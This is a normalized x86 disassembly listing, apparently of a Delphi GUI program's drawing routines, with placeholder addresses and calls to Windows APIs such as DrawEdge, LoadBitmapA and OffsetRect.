cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457198
cmp ebx eax
jl r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424fb8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
inc [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4247f4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4276b0
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_45a81b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_428798
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_424028
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457198
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4247f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42979c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424ce0
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x10 ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457488
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247f4
mov eax [ ebp + 0x8 ]
inc [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_4242f4
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424fb8
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_424aec
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_424028
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403154
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424fb8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a184
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45acc3
lea eax [ ebp - 0x4 ]
call sub_403f50
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_459248
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_45a184
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45acdc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_45b5e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_4247f4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_424028
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032e0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_40435c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_4247f4
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_457198
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424fb8
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_4247f4
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_4247f4
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247ec
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_42979c
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_4247c8
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_424b98
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
